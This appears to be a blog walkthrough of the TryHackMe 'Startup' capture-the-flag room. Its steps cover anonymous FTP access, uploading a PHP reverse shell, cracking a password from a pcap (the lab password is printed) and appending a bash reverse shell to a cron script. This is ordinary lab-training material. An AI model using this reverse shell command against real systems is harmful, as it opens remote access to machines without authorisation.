<!-- wp:paragraph -->
<p>https://tryhackme.com/room/startup</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Run a nmap scan to find for open ports.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":990,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-57.png?w=562" alt="" class="wp-image-990"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Connect to the FTP server as anonymous.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":991,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-58.png?w=418" alt="" class="wp-image-991"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Retrieve the files to find for clues.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":993,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-59.png?w=598" alt="" class="wp-image-993"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":994,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-60.png?w=837" alt="" class="wp-image-994"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":996,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-61.png?w=870" alt="" class="wp-image-996"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Put a php reverse shell script in the FTP folder.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":998,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-62.png?w=780" alt="" class="wp-image-998"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1007,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-67.png?w=596" alt="" class="wp-image-1007"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Start a listener.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1000,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-63.png?w=876" alt="" class="wp-image-1000"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>cat recipe.txt to find the first answer.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1001,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-64.png?w=1024" alt="" class="wp-image-1001"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Start a python simple server and upload linpeas to the victim box.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1003,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-65.png?w=663" alt="" class="wp-image-1003"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Found a interesting file.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1005,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-66.png?w=866" alt="" class="wp-image-1005"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Copy the file to the ftp server.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1008,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-68.png?w=753" alt="" class="wp-image-1008"/><figcaption>cp /incidents/suspicious.pcapng /var/www/html/files/ftp/</figcaption></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1010,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-69.png?w=637" alt="" class="wp-image-1010"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Its a wireshark file, follow the tcp stream to find the password for lennie.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1011,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-70.png?w=460" alt="" class="wp-image-1011"/><figcaption>c4ntg3t3n0ughsp1c3</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Change user to lennie.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1013,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-71.png?w=341" alt="" class="wp-image-1013"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>First flag is found. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1015,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-72.png?w=323" alt="" class="wp-image-1015"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Head to the scripts folder and examine the files. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1017,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-73.png?w=426" alt="" class="wp-image-1017"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We can edit the /etc/print.sh file , edit the file with bash reverse shell script.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1021,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-75.png?w=385" alt="" class="wp-image-1021"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1026,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-77.png?w=897" alt="" class="wp-image-1026"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>echo 'bash -i >&amp; /dev/tcp/10.4.55.237/1337 0>&amp;1' >> /etc/print.sh</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1019,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-74.png?w=763" alt="" class="wp-image-1019"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Start a netcat listener and the final flag is found.  </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1022,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-76.png?w=669" alt="" class="wp-image-1022"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->
